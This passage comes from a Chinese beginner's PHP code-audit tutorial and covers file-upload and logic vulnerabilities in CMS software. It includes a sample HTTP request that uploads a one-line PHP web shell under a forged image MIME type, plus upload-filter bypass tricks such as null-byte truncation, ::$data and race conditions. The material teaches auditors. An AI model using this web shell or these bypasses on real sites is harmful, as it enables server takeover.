<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span> <span class="token operator">-</span> 存储在服务器的文件的临时副本的名称
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">-</span> 由文件上传导致的错误代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>2.文件上传的过程：</p>
<pre><code>01.用户选择文件，点击上传
02.服务器接收到文件，然后将文件保存在临时目录内
03.php对文件类型、后缀等内容检查，检查通过后移动到web目录下</code></pre><p><code>tip</code>:<br>将<code>var_dump($FILE[]);</code></p>
<p>然后试试黑盒审计吧</p>
<p>注意一点 如果文件名进入数据库也有可能造成注入的。</p>
<p>因为<code>$_FILE</code>不受<code>gpc</code>影响[之前也提过了]</p>
<h5 id="5-2-文件上传漏洞来自上传攻击总结-pdf-这极好的文章"><a href="#5-2-文件上传漏洞来自上传攻击总结-pdf-这极好的文章" class="headerlink" title="5.2 文件上传漏洞来自上传攻击总结.pdf[这极好的文章]"></a>5.2 文件上传漏洞来自<code>上传攻击总结.pdf</code>[这极好的文章]</h5><h6 id="1-javascript上传检测…-直接无视"><a href="#1-javascript上传检测…-直接无视" class="headerlink" title="1.javascript上传检测….直接无视"></a>1.<code>javascript</code>上传检测….直接无视</h6><p>用<code>burp</code>改一下就好了</p>
<h6 id="2-mime上传文件类型"><a href="#2-mime上传文件类型" class="headerlink" title="2.mime上传文件类型"></a>2.<code>mime</code>上传文件类型</h6><p>例如:<code>BlueCMS</code>(地方分类信息门户专用<code>CMS</code>系统)</p>
<p><code>include/upload.class.php</code>发现，只是检测了文件头，没有检测后缀.</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">upload</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$allow_image_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'image/jpg'</span><span class="token punctuation">,</span> <span class="token string">'image/gif'</span><span class="token punctuation">,</span> <span class="token string">'image/png'</span><span class="token punctuation">,</span> <span class="token string">'image/pjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">function</span> <span class="token function">img_upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$imgname</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token constant">BLUE_ROOT</span><span class="token punctuation">.</span><span class="token constant">DATA</span><span class="token punctuation">.</span><span class="token constant">UPLOAD</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Ym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token constant">BLUE_ROOT</span><span class="token punctuation">.</span><span class="token constant">DATA</span><span class="token punctuation">.</span><span class="token constant">UPLOAD</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'上传过程中创建目录失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$imgname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$imgname</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">create_tempname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_type</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$imgname</span> <span class="token operator">=</span> <span class="token variable">$dir</span> <span class="token punctuation">.</span> <span class="token variable">$imgname</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">allow_image_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">//只是检测了文件头部来着，那我们就直接构造一个SHELL就好了</span>
            <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'不允许的图片类型'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>Payload</code>:</p>
<p>然后我们可以将<code>request</code>包的<code>Content-Type</code>修改</p>
<pre><code>POST /upload.php HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: TE, close
Host: localhost
User-Agent: libwww-perl/5.803
Content-Type: multipart/form-data; boundary=xYzZY
Content-Length: 155   --xYzZY
Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;
Content-Type: image/gif (原为Content-Type: text/plain)//$_FILES[&quot;file&quot;][&quot;type&quot;]
&lt;?php system($_GET[&#39;command&#39;]);?&gt;
--xYzZY--</code></pre><h6 id="3-服务器检测绕过-目录路径检测"><a href="#3-服务器检测绕过-目录路径检测" class="headerlink" title="3.服务器检测绕过(目录路径检测)"></a>3.服务器检测绕过(目录路径检测)</h6><p><code>Filename</code>可以控制，直接进行<code>%00</code>截断看看能不能搞定</p>
<h6 id="4-文件名检测"><a href="#4-文件名检测" class="headerlink" title="4.文件名检测"></a>4.文件名检测</h6><p>下面就是去检测:<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code></p>
<p>再次注意:如果文件名进入数据库也有可能造成注入的。</p>
<p>1)黑名单上传</p>
<p>各种测试 这里我们看代码就可以了。</p>
<p>我们可以看看能不能</p>
<pre><code>1.大小写绕过
2.黑名单外的危险脚本[htaccess文件攻击]
3.解析漏洞结合
4.利用windows特性绕过</code></pre><p>雨牛的文章： </p>
<pre><code>https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=7806</code></pre><p><code>phpdisk</code>使用了黑名单</p>
<p>可以用加空格来绕过</p>
<p>另外大牛又给出了提交<code>.php::$data</code>这样就不会匹配到黑名单中了。 这种想法，感觉自己有学习了….</p>
<p>2)白名单上传</p>
<pre><code>1. 0x00 截断绕过
用像test.asp%00.jpg的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击，目前我只遇到过asp的程序有这种漏洞

2. 解析调用/漏洞绕过
这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞</code></pre><p>5.文件上传逻辑漏洞</p>
<pre><code>http://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</code></pre><p>不得不又一次膜拜<code>p</code>神……</p>
<p>文件上传，支持<code>zip</code>上传，但是这个<code>phpcms</code>没有对子目录下的文件，进行验证。导致<code>getshell</code>而且有了一个竞争上传的概念。。。。</p>
<p>文件是先在服务器存在了，然后再验证文件名的可靠性。不合法就删除。那就出现问题了，在存在时候，我们可以一整去访问这个<code>php</code>，而这个<code>php</code>的功能就是写马。这样就可以成功<code>getshell</code>了。。。。</p>
<h5 id="5-4-文件下载"><a href="#5-4-文件下载" class="headerlink" title="5.4.文件下载"></a>5.4.文件下载</h5><p>求补充</p>
<h5 id="5-3-文件写入。文件删除"><a href="#5-3-文件写入。文件删除" class="headerlink" title="5.3 文件写入。文件删除"></a>5.3 文件写入。文件删除</h5><p>求补充</p>
<p>=====================================================</p>
<h4 id="6-逻辑出错审计技巧"><a href="#6-逻辑出错审计技巧" class="headerlink" title="6.逻辑出错审计技巧"></a>6.逻辑出错审计技巧</h4><p>很多程序有逻辑出错的情况…..</p>
<h5 id="1-程序没有及时结束-die"><a href="#1-程序没有及时结束-die" class="headerlink" title="1.程序没有及时结束[die]"></a>1.程序没有及时结束[<code>die</code>]</h5><pre><code>http://www.wooyun.org/bugs/wooyun-2010-063019</code></pre><p><code>Ducms</code>就是<code>/install/install.php</code><br>没有及时结束</p>
<p>给<code>p</code>神 利用一个外链的<code>mysql</code>绕过限制 加入一个<code>admin</code>账户。。。</p>
<pre><code>http://wooyun.org/bugs/wooyun-2010-045143</code></pre><p>还有一个直接写入配置文件的<code>StartBBS</code>重安装<code>getshell</code>也是因为这个原因,除了安装可能出现这种情况,<code>Admin</code>目录下也可能这样</p>
<p>判定不是<code>admin</code>就跳转，但是<code>php</code>代码是继续执行没有及时结束的</p>
<h5 id="2-admin登入口检查有问题"><a href="#2-admin登入口检查有问题" class="headerlink" title="2.admin登入口检查有问题"></a>2.<code>admin</code>登入口检查有问题</h5><p>认证太奇葩…</p>
<h5 id="3-找回密码可能出现漏洞"><a href="#3-找回密码可能出现漏洞" class="headerlink" title="3.找回密码可能出现漏洞"></a>3.找回密码可能出现漏洞</h5><h5 id="4-验证码重用，造成爆破"><a href="#4-验证码重用，造成爆破" class="headerlink" title="4.验证码重用，造成爆破"></a>4.验证码重用，造成爆破</h5><p>……….</p>
<p>漏洞类型还要很多…..</p>
<p>=====================================================</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>文章写给像我一样刚刚开始审计的小菜鸟~<br><code>web</code>漏洞类型很多，我也说不尽。只是知道一些审计的皮毛，有错求指出….<br>求勿喷………..<br>小菜继续学审计中……..</p>
<hr>
<pre><code>本帖最后由wilson 于 2014-11-3 21:03 编辑
team:xdsec&amp;90sec
author：wilson
blog:http://blog.wils0n.cn/</code></pre></section>
    <!-- Tags START -->
    
      <div class="tags">
        <span>Tags:</span>
        
  <a href="/tags#代码审计" >
    <span class="tag-code">代码审计</span>
  </a>

      </div>
    
    <!-- Tags END -->
    <!-- NAV START -->
    
  <div class="nav-container">
    <!-- reverse left and right to put prev and next in a more logic postition -->
    
      <a class="nav-left" href="/archives/PHP代码审计分段讲解.html">
        <span class="nav-arrow">← </span>
        
          PHP代码审计分段讲解
        
      </a>
    
    
      <a class="nav-right" href="/archives/代码审计的艺术系列-第一篇.html">
        
          代码审计的艺术系列 第一篇
        
        <span class="nav-arrow"> →</span>
      </a>
    
  </div>

    <!-- NAV END -->
    <!-- 打赏 START -->
    
      <div class="money-like">
        <div class="reward-btn">
          赏
          <span class="money-code">
            <span class="alipay-code">
              <div class="code-image"></div>
              <b>使用支付宝打赏</b>
            </span>
            <span class="wechat-code">
              <div class="code-image"></div>
              <b>使用微信打赏</b>
            </span>
          </span>
        </div>
        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
      </div>
    
    <!-- 打赏 END -->
    <!-- 二维码 START -->
    
      <div class="qrcode">
        <canvas id="share-qrcode"></canvas>
        <p class="notice">扫描二维码，分享此文章</p>
      </div>
    
    <!-- 二维码 END -->
    
      <!-- No Comment -->
    
  </article>
  <!-- Article END -->
  <!-- Catalog START -->
  
    <aside class="catalog-container">
  <div class="toc-main">
    <strong class="toc-title">Catalog</strong>
    
      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-前言"><span class="toc-nav-text">0x01 前言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-审计前奏"><span class="toc-nav-text">0x02 审计前奏</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#一-关注变量-函数"><span class="toc-nav-text">一)关注变量+函数</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#二-关注什么样的漏洞"><span class="toc-nav-text">二)关注什么样的漏洞</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#三-本地搭建环境测试"><span class="toc-nav-text">三)本地搭建环境测试</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#四-审计各种不同漏洞技巧"><span class="toc-nav-text">四)审计各种不同漏洞技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#1-sql注入审计技巧"><span class="toc-nav-text">1.sql注入审计技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#0x01-漏洞原理"><span class="toc-nav-text">0x01 漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#0x02-漏洞发生"><span class="toc-nav-text">0x02 漏洞发生</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#0x03-注入类型"><span class="toc-nav-text">0x03 注入类型</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#0x04技巧"><span class="toc-nav-text">0x04技巧</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-xss审计技巧"><span class="toc-nav-text">2.xss审计技巧</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3-文件包含漏洞审计技巧"><span class="toc-nav-text">3.文件包含漏洞审计技巧</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#4-命令执行审计技巧"><span class="toc-nav-text">4.命令执行审计技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#0x01-搜索可以执行php代码的函数"><span class="toc-nav-text">0x01 搜索可以执行php代码的函数</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#0x02-搜索可以执行系统命令的函数"><span class="toc-nav-text">0x02 搜索可以执行系统命令的函数</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#5-文件操作审计技巧"><span class="toc-nav-text">5.文件操作审计技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#5-1-两个小知识，一个tip"><span class="toc-nav-text">5.1 .两个小知识，一个tip</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#5-2-文件上传漏洞来自上传攻击总结-pdf-这极好的文章"><span class="toc-nav-text">5.2 文件上传漏洞来自上传攻击总结.pdf[这极好的文章]</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#1-javascript上传检测…-直接无视"><span class="toc-nav-text">1.javascript上传检测….直接无视</span></a></li><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#2-mime上传文件类型"><span class="toc-nav-text">2.mime上传文件类型</span></a></li><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#3-服务器检测绕过-目录路径检测"><span class="toc-nav-text">3.服务器检测绕过(目录路径检测)</span></a></li><li class="toc-nav-item toc-nav-level-6"><a class="toc-nav-link" href="#4-文件名检测"><span class="toc-nav-text">4.文件名检测</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#5-4-文件下载"><span class="toc-nav-text">5.4.文件下载</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#5-3-文件写入。文件删除"><span class="toc-nav-text">5.3 文件写入。文件删除</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#6-逻辑出错审计技巧"><span class="toc-nav-text">6.逻辑出错审计技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#1-程序没有及时结束-die"><span class="toc-nav-text">1.程序没有及时结束[die]</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#2-admin登入口检查有问题"><span class="toc-nav-text">2.admin登入口检查有问题</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#3-找回密码可能出现漏洞"><span class="toc-nav-text">3.找回密码可能出现漏洞</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#4-验证码重用，造成爆破"><span class="toc-nav-text">4.验证码重用，造成爆破</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x03-小结"><span class="toc-nav-text">0x03 小结</span></a></li></ol>
    
  </div>
</aside>
  
  <!-- Catalog END -->
</main>

<script>
  (function () {
    var url = 'https://storysec.github.io/archives/PHP代码审计基础笔记-90sec.html';
    var banner = ''
    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
      $('#article-banner').css({
        'background-image': 'url(' + banner + ')'
      })
    } else {
      $('#article-banner').geopattern(url)
    }
    $('.header').removeClass('fixed-header')

    // error image
    $(".markdown-content img").on('error', function() {
      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
      $(this).css({
        'cursor': 'default'
      })
    })

    // zoom image
    $(".markdown-content img").on('click', function() {
      var src = $(this).attr('src')
      if (src !== 'http://file.muyutech.com/error-img.png') {
        var imageW = $(this).width()
        var imageH = $(this).height()

        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
        zoom = zoom < 1 ? 1 : zoom
        zoom = zoom > 2 ? 2 : zoom
        var transY = (($(window).height() - imageH) / 2).toFixed(2)

        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
        $('.image-view-wrap').addClass('wrap-active')
        $('.image-view-wrap img').css({
          'width': `${imageW}`,
          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
        })
        $('html').css('overflow', 'hidden')

        $('.image-view-wrap').on('click', function() {
          $(this).remove()
          $('html').attr('style', '')
        })
      }
    })
  })();
</script>


  <script>
    var qr = new QRious({
      element: document.getElementById('share-qrcode'),
      value: document.location.href
    });
  </script>






    <div class="scroll-top">
  <span class="arrow-icon"></span>
</div>
    <footer class="app-footer">
<div align="center">
    <table width="980" height="35" border="0" align="center">
        <tr>
            <td>
            友情链接：&nbsp;&nbsp;
            <a target="_blank" href="https://woj.app/">蜗居</a>
			&nbsp;|&nbsp;
            <a target="_blank" href="https://mrxn.net">Mrxn</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="http://hacktech.cn">Akkuman</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="http://www.bugsafe.cn">Poacher</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="http://www.se7ensec.cn">Se7en</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="https://www.ipz.me/">影乐</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="http://www.jiufox.com/">九尾狐</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="http://azfashao.com/">爱在发烧</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="https://www.web443.com/">Web443</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="https://deelmind.cn/">DeeLMind</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="http://www.moonsec.com/">暗月</a>
            &nbsp;|&nbsp;
            <a target="_blank" href="https://xingqingsafe.github.io/">星晴</a>
            </td>
        </tr>
    </table>
</div>

<span>
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>|
<span>
  本站访客数<span id="busuanzi_value_site_uv"></span>人次
</span>
  <p class="copyright">
    &copy; 2019 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
    <br>
    Theme by <a href="https://github.com/yanm1ng/hexo-theme-vexo" target="_blank">yanm1ng</a>
  </p>

</footer>

<script>
  function async(u, c) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
</script>
<script>
  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
    FastClick.attach(document.body);
  })
</script>

<script>
  var hasLine = 'true';
  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
    $('figure pre').each(function(i, block) {
      var figure = $(this).parents('figure');
      if (hasLine === 'false') {
        figure.find('.gutter').hide();
      }
      var lang = figure.attr('class').split(' ')[1] || 'code';
      var codeHtml = $(this).html();
      var codeTag = document.createElement('code');
      codeTag.className = lang;
      codeTag.innerHTML = codeHtml;
      $(this).attr('class', '').empty().html(codeTag);
      figure.attr('data-lang', lang.toUpperCase());
      hljs.highlightBlock(block);
    });
  })
</script>
<!-- Baidu Tongji -->

<script src="/js/script.js"></script>
  </body>
</html>